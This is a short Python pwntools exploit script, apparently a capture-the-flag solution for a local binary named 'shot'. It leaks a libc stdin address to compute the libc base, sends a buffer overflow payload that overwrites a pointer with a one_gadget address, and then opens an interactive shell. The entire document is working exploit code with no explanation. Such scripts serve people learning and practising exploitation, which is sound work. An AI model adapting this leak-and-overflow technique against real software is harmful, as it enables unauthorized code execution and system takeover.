#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./shot")
elf = ELF("./shot")
libc = elf.libc

p.sendafter("> ", '2')
p.recvuntil("stdin: ")
stdin = int(p.recv(14), 16)
log.info("stdin: "+hex(stdin))
libcBase = stdin - libc.symbols['_IO_2_1_stdin_']
one_gadget = libcBase + 0x45216

p.sendafter("> ", '1')
p.send('A'*0x10 + p64(0) + 'B'*0x10 + p64(one_gadget))
#gdb.attach(p)
p.sendafter("> ", '3')

p.interactive()
